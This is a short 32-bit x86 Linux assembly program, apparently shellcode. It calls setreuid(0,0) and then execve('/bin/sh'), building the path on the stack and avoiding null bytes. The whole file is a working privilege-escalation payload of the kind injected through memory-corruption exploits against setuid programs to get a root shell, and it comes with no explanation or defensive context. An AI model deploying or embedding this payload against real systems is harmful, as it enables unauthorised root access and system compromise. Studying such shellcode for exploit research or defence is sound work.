.section .text
.global main
main:
    #setreuid(0,0)
    xor %eax, %eax
    mov $0x46, %eax
    xor %ebx, %ebx
    xor %ecx, %ecx
    int $0x80

    #execve("/bin/sh", ["/bin/sh", "0"], null)
    xor %eax, %eax
    push %eax
    push $0x68732f2f
    push $0x6e69622f
    mov %esp, %ebx
    push %eax
    push %ebx
    mov %esp, %ecx
    xor %edx, %edx

    mov $0xb, %eax
    int $0x80
